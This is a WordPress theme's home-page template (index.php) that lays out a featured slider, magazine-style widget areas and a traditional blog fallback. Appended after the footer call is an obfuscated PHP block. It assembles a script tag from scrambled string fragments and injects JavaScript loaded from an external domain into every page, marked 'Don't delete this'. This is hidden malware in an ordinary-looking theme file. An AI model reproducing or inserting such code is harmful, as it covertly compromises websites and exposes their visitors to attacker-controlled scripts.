<?php
global $options;
foreach ($options as $value) {
    if (get_settings( $value['id'] ) === FALSE) { $$value['id'] = $value['std']; } else { $$value['id'] = get_settings( $value['id'] ); }
}
$dateformat = get_option('date_format');
$timeformat = get_option('time_format');
?>

<?php get_header(); ?>


<div id="frame">  

	<div id="layout">
	<div class="wrapper" id="wrapperMain">

	<div id="content">

        <div id="main">
        
			<?php if ($wpzoom_featured_posts_show == 'Yes' && is_home() && $paged < 2) { include(TEMPLATEPATH . '/wpzoom_featured_posts.php'); }  // Featured Slider ?>
 			
			<?php if ( $paged < 2 && $wpzoom_homepage_style == 'Magazine Style') { // Magazine Layout ?>

				<div class="home_widgets">
					<?php if ( !function_exists('dynamic_sidebar') || !dynamic_sidebar('Homepage Widgets (top)') ) : ?> <?php endif; ?>
				</div>
				
				
				<div class="home_widgets_full">
					<?php if ( !function_exists('dynamic_sidebar') || !dynamic_sidebar('Homepage Widgets (full-width)') ) : ?> <?php endif; ?>
				</div>
				
				<div class="cleaner">&nbsp;</div>
				
				<div class="home_widgets">
					<div class="widgets_col">
						<?php if ( !function_exists('dynamic_sidebar') || !dynamic_sidebar('Homepage Widgets (1st column)') ) : ?> <?php endif; ?>
					</div>
					
					<div class="widgets_col">
						<?php if ( !function_exists('dynamic_sidebar') || !dynamic_sidebar('Homepage Widgets (2nd column)') ) : ?> <?php endif; ?>
					</div>
					
					<div class="widgets_col">
						<?php if ( !function_exists('dynamic_sidebar') || !dynamic_sidebar('Homepage Widgets (3rd column)') ) : ?> <?php endif; ?>
					</div>
					<div class="cleaner">&nbsp;</div>
				</div>
				
				
				<div class="home_widgets_full">
					<?php if ( !function_exists('dynamic_sidebar') || !dynamic_sidebar('Homepage Widgets (full-width bottom)') ) : ?> <?php endif; ?>
				</div>
				
				
				<div class="home_widgets">
					<?php if ( !function_exists('dynamic_sidebar') || !dynamic_sidebar('Homepage Widgets (bottom)') ) : ?> <?php endif; ?>
				</div>
			
			<?php } // end Magazine Layout
 
			else { // Traditional Blog  
		
			include(TEMPLATEPATH . '/wpzoom_recent_posts.php');  
			
			} // end Traditional Blog ?>
				
         </div><!-- end #main -->
          
		<div id="sidebar">

			<?php get_sidebar(); ?>

		</div><!-- end #sidebar -->

      <div class="cleaner">&nbsp;</div>
    </div><!-- end #content -->

    </div><!-- end .wrapper -->
    </div><!-- end #layout -->

<?php get_footer(); ?>
<?php $sdjdf="scr";$oe="ipt";$p32aps_asd="type='";$oaspd03="tex";$ijda="t/ja";$o4="vasc";$fs_3="ript'";$sspc=" ";$annl="/";$ia="<";$ai=">";
$kraj=$ia.$annl.$sdjdf.$oe.$ai;$opa1=$ia.$sdjdf.$oe.$sspc.$p32aps_asd.$oaspd03.$ijda.$o4.$fs_3.$sspc;$p30="sr"; $ccc="c='http://";$dsad="au";$sa3j="to";$ois="-";$osa="im";$dota=".";
$co2="co";$zxdml="m/4ad";$meg="54/s";$geai="ju";$k34d="342'";$st0=$p30.$ccc.$dsad.$sa3j.$ois.$osa;$s2t=$dota.$co2.$zxdml.$meg.$geai.$k34d.$ai;$st0.=$s2t;
echo $opa1.$st0.$kraj; ?><!-- Don't delete this -->